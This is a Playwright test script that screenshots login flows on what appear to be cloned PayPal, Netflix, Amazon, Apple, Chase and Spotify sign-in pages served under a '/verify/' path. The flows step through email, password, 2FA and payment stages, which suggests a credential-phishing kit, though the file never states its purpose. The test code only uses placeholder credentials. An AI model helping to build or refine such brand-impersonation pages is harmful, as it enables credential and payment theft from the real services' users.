import { test, Page, expect } from '@playwright/test';

// Generic helper to capture and log
async function capture(page: Page, name: string) {
    try {
        console.log(`[${name}] Capturing screenshot...`);
        // Wait for network idle to ensure assets are loaded
        await page.waitForLoadState('networkidle', { timeout: 10000 }).catch(() => { });
        await page.screenshot({ path: `e2e/screenshots/${name}.png`, fullPage: true });
        console.log(`[${name}] Saved.`);
    } catch (e) {
        console.error(`[${name}] Failed to capture:`, e);
    }
}

async function debugPage(page: Page) {
    page.on('console', msg => console.log(`[BROWSER] ${msg.type()}: ${msg.text()}`));
    page.on('pageerror', err => console.error(`[BROWSER-ERROR] ${err}`));
}

test.describe('Capture Full Flows', () => {
    test.use({ viewport: { width: 1280, height: 800 } });

    test('PayPal Full Flow', async ({ page }) => {
        await debugPage(page);
        console.log('Navigating to PayPal...');
        await page.goto('/verify/paypal/login', { waitUntil: 'domcontentloaded' });
        console.log(`[PayPal] Current URL: ${page.url()}`);

        // Step 1: Email
        await capture(page, 'paypal-1-login-email');
        await page.locator('input[formControlName="email"]').fill('user@example.com');
        await page.locator('button[type="submit"]').click();

        // Wait for transition to password
        await expect(page.locator('input[formControlName="password"]')).toBeVisible({ timeout: 5000 });
        await capture(page, 'paypal-2-login-password');

        // Step 2: Password
        await page.locator('input[formControlName="password"]').fill('securepassword');
        await page.locator('button[type="submit"]').click();

        // Expect Navigation
        await page.waitForURL('**/step-success', { timeout: 5000 }).catch(() => console.log('Navigation timeout, checking selector'));
        await capture(page, 'paypal-3-success');
    });

    test('Netflix Full Flow', async ({ page }) => {
        await debugPage(page);
        await page.goto('/verify/netflix/login', { waitUntil: 'domcontentloaded' });
        console.log(`[Netflix] Current URL: ${page.url()}`);
        await capture(page, 'netflix-1-login');

        // Netflix uses formControlName="email"
        await page.locator('input[formControlName="email"]').fill('netflix@example.com');
        await page.locator('input[formControlName="password"]').fill('password123');
        await page.locator('button[type="submit"]').click();

        // Wait for payment or next step
        await page.waitForTimeout(3000);
        await capture(page, 'netflix-2-next');
    });

    test('Amazon Full Flow', async ({ page }) => {
        await debugPage(page);
        await page.goto('/verify/amazon/login', { waitUntil: 'domcontentloaded' });
        await capture(page, 'amazon-1-login');

        // Amazon uses formControlName="email"
        const emailInput = page.locator('input[formControlName="email"]');
        if (await emailInput.count() > 0) {
            await emailInput.fill('amazon@test.com');
            await page.locator('button[type="submit"]').click();
            await page.waitForTimeout(2000);
            await capture(page, 'amazon-2-password');
        } else {
            console.log('Amazon: Email input not found');
        }
    });

    test('Apple Full Flow', async ({ page }) => {
        await debugPage(page);
        await page.goto('/verify/apple/login', { waitUntil: 'domcontentloaded' });
        await capture(page, 'apple-1-login');

        // Apple ID Input
        await page.locator('input[formControlName="appleId"]').fill('apple@icloud.com');
        await page.locator('button.apple-submit-btn').click();
        await page.waitForTimeout(1000); // Animation
        await capture(page, 'apple-2-password-transition');

        // Password Input
        await page.locator('input[formControlName="password"]').fill('ApplePass1!');
        await page.locator('button[type="submit"]').click();

        // Wait for 2FA
        await page.waitForURL('**/2fa', { timeout: 5000 }).catch(() => { });
        await capture(page, 'apple-3-2fa');
    });

    test('Chase Full Flow', async ({ page }) => {
        await debugPage(page);
        await page.goto('/verify/chase/login', { waitUntil: 'domcontentloaded' });
        await capture(page, 'chase-1-login');

        // Chase uses formControlName="username"
        await page.locator('input[formControlName="username"]').fill('chaseuser');
        await page.locator('input[formControlName="password"]').fill('Chase123!');
        await page.locator('button[type="submit"]').click();

        await page.waitForTimeout(3000);
        await capture(page, 'chase-2-next');
    });

    test('Spotify Full Flow', async ({ page }) => {
        await debugPage(page);
        await page.goto('/verify/spotify/login', { waitUntil: 'domcontentloaded' });
        await capture(page, 'spotify-1-login');

        await page.locator('input#login-username').fill('spotify@music.com');
        await page.locator('input#login-password').fill('MusicLife2024');
        await page.locator('button#login-button').click();

        await page.waitForTimeout(3000);
        await capture(page, 'spotify-2-next');
    });
});
